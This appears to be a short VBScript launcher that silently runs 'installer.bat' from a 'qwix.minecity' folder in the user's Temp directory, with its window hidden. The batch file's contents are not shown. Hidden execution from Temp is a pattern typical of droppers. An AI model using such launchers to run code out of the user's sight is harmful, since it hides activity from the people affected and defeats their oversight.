Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "%localappdata%\Temp\qwix.minecity\installer.bat" & Chr(34), 0
Set WshShell = Nothing